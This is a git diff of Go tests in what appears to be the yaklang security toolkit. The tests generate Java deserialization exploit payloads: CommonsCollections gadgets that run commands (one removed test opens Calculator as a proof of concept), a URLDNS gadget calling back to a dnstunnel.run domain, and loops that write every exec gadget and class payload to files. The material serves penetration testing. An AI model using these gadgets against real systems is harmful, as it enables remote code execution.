@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yserx"
+	"os"
 	"strconv"
 	"testing"
 )
@@ -11139,13 +11140,6 @@ func TestTmplBase64(t *testing.T) {
 	}
 	yserx.ParseJavaSerialized(raw)
 }
-func TestGetEchoCommonsCollections2(t *testing.T) {
-	g := GetEchoCommonsCollections2()
-	gg, _ := g("open /System/Applications/Calculator.app")
-	objj := yserx.MarshalJavaObjects(gg)
-	//hexx := codec.EncodeToHex(objj)
-	fmt.Println(codec.EncodeBase64(objj))
-}
 
 func TestGetURLDNSJavaObject(t *testing.T) {
 	g, err := GetFindGadgetByDNSJavaObject("mblkzaekdw.dnstunnel.run")
@@ -11169,4 +11163,52 @@ func TestFindClassByBombJavaObject(t *testing.T) {
 		panic(err)
 	}
 	fmt.Println(hex.EncodeToString(objBytes))
+}
+func TestGenClassFile(t *testing.T) {
+	for name, payload := range AllClasses {
+		obj, err := payload.Generator(&ClassGenConfig{
+			Command: "{{command}}",
+			Host:    "{{Host}}",
+			Port:    1,
+			Token:   "{{Token}}",
+			Domain:  "{{Domain}}",
+		})
+		if err != nil {
+			println(name)
+			continue
+		}
+		byts, err := ToBytes(obj)
+		if err != nil {
+			println(name)
+			continue
+		}
+		os.WriteFile(fmt.Sprintf("/Users/z3/Downloads/class-file/%s.class", name), byts, 0666)
+	}
+}
+
+func TestGenGadgetFile(t *testing.T) {
+	for _, gadgetInfo := range GetAllRuntimeExecGadget() {
+		gadget, err := gadgetInfo("{{command}}")
+		if err != nil {
+			t.Fatal(err)
+		}
+		byts, err := ToBytes(gadget)
+		if err != nil {
+			println(gadget.verbose.Name)
+			continue
+		}
+		os.WriteFile(fmt.Sprintf("/Users/z3/Downloads/ser-file/%s.ser", gadget.verbose.Name), byts, 0666)
+	}
+	//for _, gadgetInfo := range GetAllTemplatesGadget() {
+	//	gadget, err := gadgetInfo(SetClassBytes([]byte("")))
+	//	if err != nil {
+	//		t.Fatal(err)
+	//	}
+	//	byts, err := ToBytes(gadget)
+	//	if err != nil {
+	//		println(gadget.verbose.Name)
+	//		continue
+	//	}
+	//	os.WriteFile(fmt.Sprintf("/Users/z3/Downloads/ser-file/%s.ser", gadget.verbose.Name), byts, 0666)
+	//}
 }
